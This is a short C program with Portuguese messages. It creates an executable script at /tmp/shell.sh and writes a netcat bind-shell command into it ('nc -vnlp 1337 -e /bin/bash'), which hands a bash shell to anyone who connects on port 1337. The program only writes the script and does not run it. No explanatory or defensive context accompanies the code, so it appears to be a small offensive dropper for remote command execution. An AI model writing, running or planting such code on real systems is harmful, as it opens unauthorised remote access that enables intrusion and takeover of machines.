#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

int main(void){

	int arquivo = open("/tmp/shell.sh", O_RDWR|O_CREAT, 0777);
	char rce[50] = "nc -vnlp 1337 -e /bin/bash";
	if (arquivo == -1){
		printf("erro ao criar o arquivo");
	}else{
		printf("sucesso ao criar o arquivo!");
		ssize_t write_rce = write(arquivo, rce, sizeof(rce));
		if (write_rce == -1){
			printf("\n[!] ERRO AO ESCREVER! %d",write_rce);
		}
	}
	close(arquivo);
	return 0;
}
